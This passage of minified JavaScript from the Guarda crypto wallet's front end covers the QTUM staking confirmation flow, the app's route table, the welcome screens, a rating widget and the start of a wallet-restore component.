                if (r.length && n.walletFrom) {
                    const e = l(n.walletFrom);
                    e && p(e)
                }
            }
            ), [n.walletFrom, l, r]);
            (0,
            O.useEffect)(( () => {
                e(updateWalletsBalanceAndTxs(m, {
                    isCascade: !1
                }))
            }
            ), [e, m]);
            (0,
            O.useEffect)(( () => {
                StakingQtumConfirm_setProcess(_ ? {
                    processText: "Loading Fee...",
                    setSyncProcess: c
                } : {
                    processText: "",
                    setSyncProcess: c
                })
            }
            ), [_]);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    PZ = !1;
                    StakingQtumConfirm_setProcess({
                        processText: "",
                        setSyncProcess: c
                    });
                    i(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                o && !s && i(!0);
                if (!o) {
                    PZ = !1;
                    i(!1)
                }
            }
            ), [s, o]);
            const handleUpdateBalance = t => async () => {
                await StakingQtumConfirm_setProcess({
                    processText: "Updating wallet balance...",
                    setSyncProcess: c
                });
                await e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !1
                }));
                await StakingQtumConfirm_setProcess({
                    processText: "",
                    setSyncProcess: c
                })
            }
              , handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-qtum/staking"),
                    search: a.search
                })
            }
            ;
            if (!m || !g)
                return null;
            const b = m.hw || g.hw
              , k = (0,
            Ko.gt)(n.amount, m.balance)
              , S = Number(y) + 1
              , C = E(n.amount, m)
              , N = E(S || void 0, g)
              , T = (0,
            Ko.h9)(n.amount, S)
              , handleConfirm = async () => {
                if (PZ)
                    return;
                const a = cc.$.txPerformanceStart();
                PZ = !0;
                d("");
                if ((0,
                Ko.G)(T, 0))
                    return;
                await StakingQtumConfirm_setProcess({
                    processText: "Updating wallet balance...",
                    setSyncProcess: c
                });
                await e(updateWalletsBalanceAndTxs(m, {
                    isCascade: !1
                }));
                await StakingQtumConfirm_setProcess({
                    processText: `Loading ${(0,
                    be.xG)(m.currency)} Blockchain adapter...`,
                    setSyncProcess: c
                });
                await StakingQtumConfirm_setProcess({
                    processText: "Preparing transaction...",
                    setSyncProcess: c
                });
                const r = await Se.Z.getApiByWallet(m);
                try {
                    const e = await r.stake({
                        wallet: m,
                        validatorAddress: n.validatorAddress,
                        fee: Number(n.validatorFee),
                        amount: n.amount
                    });
                    if (e.message) {
                        d(e.message);
                        return
                    }
                    if (e.hash) {
                        cc.$.send(cc.d.STAKING_SEND, "qtum");
                        const r = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_STAKE, m.currency, `${r} ms`);
                        const l = new URLSearchParams({
                            type: "qtumStakingTx",
                            amount: n.amount || "",
                            hash: e.hash,
                            walletFrom: m.uuid,
                            currency: m.currency
                        });
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: l.toString()
                        })
                    }
                } catch (e) {
                    d("Transaction failed")
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm", O.createElement("br", null), O.createElement("br", null), O.createElement(ui_message, {
                type: "info"
            }, "You can only stake the whole balance to one Validator. QTUM blockchain freezes your balance for about 18 hours after you stake. All incoming QTUM will be automatically delegated to the current Validator."))), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", (0,
            Ko.yF)(n.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will stake", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(n.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: C,
                renderCurrency: !0
            })))), m && n.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: m
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Validator", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, O.createElement("span", {
                id: "qtumValidator"
            }, n.validatorTitle), n.validatorRate ? ` - ${n.validatorRate}%` : "", O.createElement(ConfirmInfoSubValue, null, n.validatorAddress))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, !y || _ ? "–" : O.createElement("span", null, S, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(g.currency))), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: N
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(n.toConvert || h))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will be deposited"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.G)(T, 0) ? "0" : (0,
            Ko.yF)(T), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(m.currency)))), O.createElement("div", {
                className: dM
            }), (k || (0,
            Ko.G)(T, 0)) && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(m.currency), " Balance. Available balance: ", m.balance, " ", (0,
            be.xG)(m.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(m)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: g
            }), s && b && O.createElement(ui_message, null, "Please unlock you ", m.hw, ", choose ", (0,
            be.xG)(m.family), " app and then press Confirm."), v && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: w
            }, "try again")), u && O.createElement(bf, {
                error: u
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, o && O.createElement("span", null, o)), !s && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !s && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: s
            }, "Confirm")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: n.amountInUsd
            }))
        }
        ;
        function board_extends() {
            board_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return board_extends.apply(this, arguments)
        }
        const board = () => O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: "row"
        }, O.createElement("div", {
            className: "col-xs-4 electron-left-column sticky-dashboard"
        }, O.createElement(DashboardWallets, null)), O.createElement("div", {
            className: "col-xs-8 electron-right-column"
        }, O.createElement(Banners_Banners, null), O.createElement(j.rs, null, O.createElement(j.AW, {
            exact: !0,
            path: "/app",
            component: BoardMainPage_BoardMainPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/receive",
            component: BoardMainPage_BoardMainPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/send",
            component: BoardSendPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/send/confirm",
            component: PM
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/send/success",
            component: BoardSendSuccess
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-clo",
            component: yZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-clo/staking",
            component: yZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-clo/staking/confirm",
            component: StakingCloConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/add-token-hbar/",
            component: bZ
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/add-token-hbar/confirm",
            component: PageConfirmAddTokenHbar
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/add-token-hbar/success",
            component: PageSuccessAddTokenHbar
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/bch-split",
            component: BchSplitMainPage_BchSplitMainPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/bch-split/confirm",
            component: BchSplitConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/bch-split-complete/confirm",
            component: BchSplitCompleteConfirm_BchSplitCompleteConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-xtz",
            component: StakingXtzIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-xtz/staking",
            component: StakingXtzIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-xtz/staking/confirm",
            component: XtzStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-qtum",
            component: StakingQtumIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-qtum/staking",
            component: StakingQtumIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-qtum/staking/confirm",
            component: StakingQtumConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-bnb",
            component: OG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-bnb/staking",
            component: OG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-bnb/staking/confirm",
            component: MG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-bnb/unstaking",
            component: zG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-bnb/unstaking/confirm",
            component: $G
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-one",
            component: qG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-one/staking",
            component: qG
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-one/staking/confirm",
            component: OneStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-one/unstaking/confirm",
            component: OneUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-one/claim/confirm",
            component: OneClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eth",
            component: StakingEthIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eth/confirm",
            component: pK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ada",
            component: DV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ada/staking",
            component: DV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ada/staking/confirm",
            component: AdaStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ada/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil",
            component: eK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil/staking",
            component: eK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil/staking/confirm",
            component: StakingZilConfirmStaking
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil/unstaking",
            component: aK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil/unstaking/confirm",
            component: StakingZilConfirmUNstaking
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil/withdraw/confirm",
            component: StakingZilConfirmWithdraw
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-zil/claim/confirm",
            component: StakingZilConfirmClaim
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/airdrop-xrp/claim",
            component: BoardXrpSparkAirdropPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/xrp-delete-account",
            component: BoardXrpDeleteAccPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/xrp-delete-account/confirm",
            component: BoardXrpDeleteAccConfirmPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eos",
            component: GK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eos/staking",
            component: GK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eos/staking/confirm",
            component: KK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eos/unstaking",
            component: YK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-eos/unstaking/confirm",
            component: XK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-atom",
            component: iK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-atom/staking",
            component: iK
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-atom/staking/confirm",
            component: AtomStakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-atom/unstaking/confirm",
            component: AtomUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-atom/claim/confirm",
            component: AtomClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx",
            component: iH
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/staking",
            component: iH
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/confirm",
            component: StakeConfirm_StakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/unstaking",
            component: TrxUnstake
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/delegate-resources",
            component: TrxDelegateResources
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/undelegate-resources",
            component: TrxUndelegateResources
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/delegate-resources/confirm",
            render: e => O.createElement(TrxConfirmResources, board_extends({
                type: "delegate"
            }, e))
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/undelegate-resources/confirm",
            render: e => O.createElement(TrxConfirmResources, board_extends({
                type: "undelegate"
            }, e))
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/unstaking/confirm",
            component: TrxUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/cancel-unstake/confirm",
            component: TrxCancelUnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/withdraw/confirm",
            component: TrxWithdrawConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-trx/vote",
            component: VoteTrx
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont",
            component: UV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont/staking",
            component: UV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont/staking/confirm",
            component: StakeConfirm_StakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont/unstaking",
            component: $V
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont/unstaking/confirm",
            component: UnstakeConfirm_UnstakeConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont/claim/confirm",
            component: ClaimConfirm_ClaimConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/staking-ont/redeem/confirm",
            component: QV
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/ud",
            component: UdRegisterAddress
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/ud/select-wallets",
            component: UdSelectWallets
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/ud/payment",
            component: UdPaymentIndex
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/ud/view",
            component: Uz
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/crux",
            component: CruxRegisterAddress
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/crux/select-wallets",
            component: select_wallets_BoardSendConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/select-wallets",
            component: fio_select_wallets_BoardSendConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/invoice-approve",
            component: FioInvoiceApprovePage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/invoice-approve/confirm",
            component: FioApproveInvoiceConfirmPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/invoice-create",
            component: BoardFioRequestPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/invoice-create/confirm",
            component: confirm_BoardSendConfirm
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/register-address",
            component: nj
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/payment",
            component: FioPaymentAddress
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/fio/manage",
            component: FioRegisterAddress
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/reset-eos",
            component: ResetEosAccountCreationState
        }), O.createElement(j.AW, {
            component: _404
        })))))
          , LZ = "welcome_centerContainer_1Q44- app_centerContainer_1VI1M"
          , FZ = {
            wrapper: "gray-block_wrapper_fNVpe"
        }
          , WZ = undefined
          , gray_block = e => {
            let {transparent: t, children: a} = e;
            return O.createElement("div", {
                className: Ht()(FZ.wrapper, {
                    [FZ.transprent]: t
                })
            }, a)
        }
          , RZ = {
            wrapper: "white-block_wrapper_2WSSR"
        }
          , BZ = undefined
          , white_block = e => {
            let {className: t, transparent: a, children: n} = e;
            return O.createElement("div", {
                className: Ht()(RZ.wrapper, {
                    [RZ.transprent]: a
                }, t)
            }, n)
        }
          , OZ = "welcome-body_whiteBlock_Ql6uh"
          , DZ = "welcome-body_button_V-_rZ"
          , MZ = "notification_notification_2E5bE"
          , UZ = "notification_rightBlock_1mKt7"
          , GZ = "notification_leftBlock_3Dvoz"
          , VZ = "notification_storeButton_Wo6OA"
          , KZ = "notification_logo_1PerA"
          , HZ = "notification_text_3GYxd"
          , zZ = "notification_close_3hGCK"
          , jZ = "notification_reviews_1o_gR"
          , $Z = a.p + "18e9681658895e8921abdb8c2b853f82.svg"
          , ZZ = a.p + "8098b70649233396c722ff7286814118.svg"
          , YZ = "rating_starsList_U8Vwl"
          , qZ = "rating_starsItem_IiiV-"
          , XZ = a.p + "7723bff82ed6648e27168faf1fdbd71d.svg"
          , QZ = a.p + "0a03f33c70889e34699fe1c5d8863ac2.svg"
          , JZ = a.p + "7f9108475fef154cbf55db81ef74419d.svg"
          , eY = a.p + "a5c4b93d6cc51905e4cf1cc17f8a398f.svg"
          , tY = a.p + "7a44470c23e244a74b9c48c4fbde2a03.svg"
          , aY = a.p + "da9ffc54489157b2aacc357050763303.svg";
        function Rating(e) {
            let {rating: t, isRedStar: a} = e;
            const n = new Array(Math.floor(t)).fill(1);
            return O.createElement("ul", {
                className: YZ
            }, t && n.map(( () => O.createElement("li", {
                key: `fullStar${(0,
                he.Z)()}`,
                className: qZ
            }, O.createElement("img", {
                src: a ? eY : XZ,
                alt: "full star"
            })))), 5 != +t && (Number.isInteger(t) ? O.createElement("li", {
                key: "emptyStar",
                className: qZ
            }, O.createElement("img", {
                src: a ? tY : QZ,
                alt: "empty star"
            }), " ") : O.createElement("li", {
                key: "halfStar",
                className: qZ
            }, O.createElement("img", {
                src: a ? aY : JZ,
                alt: "full star"
            }))), t && t <= 4 && new Array(4 - n.length).fill("0").map(( () => O.createElement("li", {
                key: `emptyStar${(0,
                he.Z)()}`,
                className: qZ
            }, O.createElement("img", {
                src: a ? tY : QZ,
                alt: "empty star"
            })))))
        }
        Rating.propTypes = {
            rating: as().number,
            isRedStar: as().bool
        };
        const nY = O.memo(Rating);
        function notification_Notification(e) {
            let {setShowNotification: t, mobilePlatform: a, storeLink: n} = e;
            const [r,l] = (0,
            O.useState)(4.6)
              , [s,i] = (0,
            O.useState)("300+");
            (0,
            O.useEffect)((async () => {
                if ("Android" === a) {
                    l(4.6);
                    i("2000+")
                }
                if ("iOS" === a)
                    try {
                        const {data: e} = await Jf().get("https://itunes.apple.com/lookup?id=1442083982");
                        l(+Number(e.results[0].averageUserRating).toFixed(1));
                        i(e.results[0].userRatingCount)
                    } catch (e) {
                        l(4.6);
                        i("300+")
                    }
            }
            ), [a]);
            const handlerClick = () => {
                window.open(n);
                t(!1)
            }
              , handlerClose = () => {
                t(!1)
            }
            ;
            return O.createElement("div", {
                className: MZ
            }, O.createElement("div", {
                className: GZ
            }, O.createElement("img", {
                className: KZ,
                src: $Z,
                alt: "guarda logo"
            }), O.createElement("span", {
                className: HZ
            }, "Guarda Wallet: ", O.createElement("br", null), " Bitcoin, Dash ", O.createElement("br", null), O.createElement(nY, {
                rating: r
            }), O.createElement("span", {
                className: jZ
            }, "(", s && s, ")"))), O.createElement("div", {
                className: UZ
            }, O.createElement(Yl, {
                className: VZ,
                size: "small",
                onClick: handlerClick
            }, "Get the app"), O.createElement("img", {
                className: zZ,
                onClick: handlerClose,
                src: ZZ,
                alt: "cancel"
            })))
        }
        notification_Notification.propTypes = {
            setShowNotification: as().func,
            mobilePlatform: as().string,
            storeLink: as().string
        };
        const rY = notification_Notification
          , lY = "welcom-body-electrom_main_3vkSi"
          , sY = "welcom-body-electrom_mainLogo_D7Ce0"
          , iY = "welcom-body-electrom_buttonCreate_1gdFP"
          , oY = "welcom-body-electrom_buttonRestore_1ltDB"
          , cY = "welcom-body-electrom_info_1nMFP"
          , uY = "welcom-body-electrom_infoLogo_3rQgi"
          , dY = a.p + "4598aba4174540b6f9adada41a8b3d31.svg"
          , mY = a.p + "9fb0f622f0552e1d565e034562b56aad.svg"
          , pY = "new-electron-background-logo_background_UMDuM"
          , fY = "new-electron-background-logo_wrapper_1kY_e"
          , EY = "new-electron-background-logo_mainLogo_U_5Tw"
          , hY = "new-electron-background-logo_backgroundLogo_22cs_"
          , gY = "new-electron-background-logo_logoBg_jJA-X"
          , yY = a.p + "420b18a96051e30d9d97874f4556bf51.svg";
        function ElectronBackgroundLogo(e) {
            let {children: t} = e;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: pY
            }, O.createElement("div", {
                className: fY
            }, O.createElement("div", null, t), O.createElement("div", {
                className: hY
            }, O.createElement("img", {
                className: gY,
                alt: "backgroundLogoOuter",
                src: yY
            })))))
        }
        const vY = ElectronBackgroundLogo;
        function AppComponentWelcomeElectron() {
            const e = (0,
            j.TH)()
              , t = AttackManager.isDirty();
            function createLink(t) {
                const a = new URLSearchParams(e.search);
                a.set("redirectUri", e.pathname);
                return (0,
                M.RU)(`${t}?${a.toString()}`)
            }
            return O.createElement(O.Fragment, null, O.createElement(vY, null, O.createElement("div", {
                className: lY
            }, O.createElement("div", {
                className: sY
            }, O.createElement(Y.OL, {
                to: "/app"
            }, O.createElement("img", {
                src: dY,
                alt: "logo"
            }))), O.createElement(Y.OL, {
                to: createLink("/create")
            }, O.createElement(Yl, {
                className: iY,
                size: "big",
                id: "createNewWallet",
                color: "white"
            }, "Create a new wallet")), O.createElement(Y.OL, {
                to: createLink("/restore")
            }, O.createElement(Yl, {
                className: oY,
                size: "big",
                color: "transparent-blue"
            }, "Restore or Import")), t && O.createElement(_m, {
                currency: "btc"
            })), O.createElement("div", {
                className: cY
            }, O.createElement("span", {
                className: uY
            }, O.createElement("img", {
                src: mY,
                width: 24,
                height: 24,
                alt: "info-icon"
            })), O.createElement("a", {
                href: "https://support.guarda.com/getting-started/what-is-guarda",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "What exactly is Guarda Wallet?"))))
        }
        const _Y = AppComponentWelcomeElectron;
        function AppComponentWelcome() {
            const e = (0,
            j.TH)()
              , t = AttackManager.isDirty();
            function createLink(t) {
                const a = new URLSearchParams(e.search);
                a.set("redirectUri", e.pathname);
                return (0,
                M.RU)(`${t}?${a.toString()}`)
            }
            const [a,n] = (0,
            O.useState)(!0)
              , {mobilePlatform: r, storeLink: l} = getMobilePlatfotm();
            return (0,
            M.d)() ? O.createElement(_Y, null) : O.createElement(O.Fragment, null, O.createElement(white_block, {
                className: OZ
            }, O.createElement("h2", {
                id: "createWalletOpen"
            }, "Hello! Welcome to Guarda Wallet"), O.createElement("p", null, "This wallet makes it easy to access your crypto and interact with blockchain. Guarda does not have access to your funds.", O.createElement("br", null), O.createElement("br", null), "Restore your existing Guarda Wallet, import private key from any other one to create a new Wallet right now!"), O.createElement(Y.OL, {
                to: createLink("/create")
            }, O.createElement(Yl, {
                className: DZ,
                size: "big",
                color: "blue",
                id: "createNewWallet",
                "data-test-name": "create-a-new-wallet"
            }, "Create a new wallet")), O.createElement(Y.OL, {
                to: createLink("/restore")
            }, O.createElement(Yl, {
                className: DZ,
                size: "big",
                color: "transparent-blue",
                "data-test-name": "restore-or-import"
            }, "Restore or Import")), t && O.createElement(_m, {
                currency: "btc"
            })), O.createElement(gray_block, null, O.createElement("ul", null, O.createElement("li", null, O.createElement("a", {
                href: "https://support.guarda.com/getting-started/what-is-guarda",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "What exactly is Guarda Wallet?")), O.createElement("li", null, O.createElement("a", {
                href: "https://support.guarda.com/security/how-to-import-a-wallet-with-its-private-key",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "How to import another wallet here?")))), a && r && O.createElement(rY, {
                setShowNotification: n,
                mobilePlatform: r,
                storeLink: l
            }))
        }
        const wY = AppComponentWelcome;
        function WelcomeRoot() {
            return O.createElement("div", {
                className: "container",
                "data-test-name": "welcome-root"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-6 col-xs-offset-3"
            }, O.createElement("div", {
                className: LZ
            }, O.createElement(wY, null)))))
        }
        const bY = "import-wallets_icon_21kLx change-password_icon_2B12u"
          , kY = "import-wallets_clearPassIconBlue_ozUg_ change-password_clearPassIconBlue_17_Q2"
          , SY = "import-wallets_clearPassIcon_11cmO change-password_clearPassIcon_SWaqm"
          , CY = "import-wallets_leftIcon_3hFR3 change-password_leftIcon_KOJkO"
          , NY = "import-wallets_rightIcon_1FuZW change-password_leftIcon_KOJkO"
          , TY = "import-wallets_showPassIconBlue_1kpxc change-password_showPassIconBlue_1XcoB"
          , AY = "import-wallets_showPassIcon_3W54G change-password_showPassIcon_1rub_"
          , xY = "import-wallets_hidePassIconBlue_n6QTX change-password_hidePassIconBlue_1rDTt"
          , IY = "import-wallets_hidePassIcon_1o5UF change-password_hidePassIcon_12q18"
          , PY = "import-wallets_bigDot_1yRkR change-password_bigDot_3Qbpx"
          , LY = "import-wallets_error_2mcfv change-password_error_1TVjI"
          , FY = "import-wallets_centerContainer_2F4IB app_centerContainer_1VI1M"
          , WY = "import-wallets_inlineButtons_2nU-0"
          , RY = "import-wallets_wrapperContainerWallets_3Poum"
          , BY = "import-wallets_wrapperWalletsList_4cv8g"
          , OY = "import-wallets_emptyWallets_Kj_xY"
          , DY = "import-wallets_iconClose_3mSCo"
          , MY = "import-wallets_walletBlock_3BHMa"
          , UY = "import-wallets_wrapperImportBlock_2X-Eq"
          , GY = "import-wallets_headerImport_zPD5e"
          , VY = "import-wallets_descriptionImport_1wVMh"
          , KY = "import-wallets_toggleRestoreType_3Zyd9"
          , HY = "import-wallets_toggleAdvancedOptions_19IbQ"
          , zY = "import-wallets_dragAndDropArea_1_cYc"
          , jY = "import-wallets_textarea_17WIt"
          , $Y = "import-wallets_isDraging_16Yj6"
          , ZY = "import-wallets_h3_3HHoB"
          , YY = "import-wallets_p_2VogS"
          , qY = "import-wallets_isMobile_3TGKO"
          , XY = "import-wallets_inputFieldset_1RS6q"
          , QY = "import-wallets_wrapperAddButton_3X4hf"
          , JY = "import-wallets_textareaFieldset_30D9y"
          , tq = "import-wallets_textareaLegend_2lFQ4"
          , aq = "import-wallets_buttonUpload_3DdWu button_button_3_BTF button_small_MkI59"
          , nq = "import-wallets_dragText_1NcS8"
          , rq = "import-wallets_inputUpload_3Px7e"
          , lq = "import-wallets_file_BG8zP"
          , sq = "import-wallets_fileTitle_1zhGa"
          , iq = "import-wallets_closeIcon_20Pr0"
          , oq = "import-wallets_errorPrivateKey_1teFs"
          , cq = "import-wallets_checkbox_1gDIZ"
          , uq = "import-wallets_fakeDragAndDropArea_31Pxt"
          , dq = "import-wallets_isVisible_2HqJ2"
          , mq = "import-wallets_buttonText_3w7Lg"
          , pq = "import-wallets_inputPassword_6JBqJ"
          , fq = "import-wallets_inputLegend_1-VeE"
          , Eq = "import-wallets_inputShowPass_2Sa_l"
          , hq = "import-wallets_inputFocus_MPq7n"
          , gq = "import-wallets_iconRestore_3k2mR"
          , yq = "import-wallets_iconRestoreWrapper_3Ihxp"
          , vq = "import-wallets_iconDrop_1xFjr"
          , _q = "import-wallets_pasteButton_wBdeO"
          , wq = "import-wallets_mobileButton_3lail"
          , bq = a.p + "4e3a9a11472a9c4341a49011f99fb839.svg"
          , useLoading = () => {
            const e = (0,
            O.useRef)(!1)
              , [t,a] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                e.current = !0;
                return () => {
                    e.current = !1
                }
            }
            ), []);
            const n = undefined;
            return {
                isLoading: t,
                withLoading: t => async function() {
                    a(!0);
                    try {
                        return await t(...arguments)
                    } finally {
                        e.current && a(!1)
                    }
                }
            }
        }
          , kq = a.p + "dfe84b84e817911aac7623bab4c87999.svg";
        function RestoreTab(e) {
            let {type: t, description: a="You will be able to restore your wallet by using a Backup if you are a user of Guarda Wallet.", title: n="Restore", noTitle: r, noShowPassIcon: l, customStyles: s} = e;
            const i = (0,
            $.I0)()
              , o = (0,
            $.v9)(oe.A0)
              , [c,u] = (0,
            O.useState)(null)
              , [d,m] = (0,
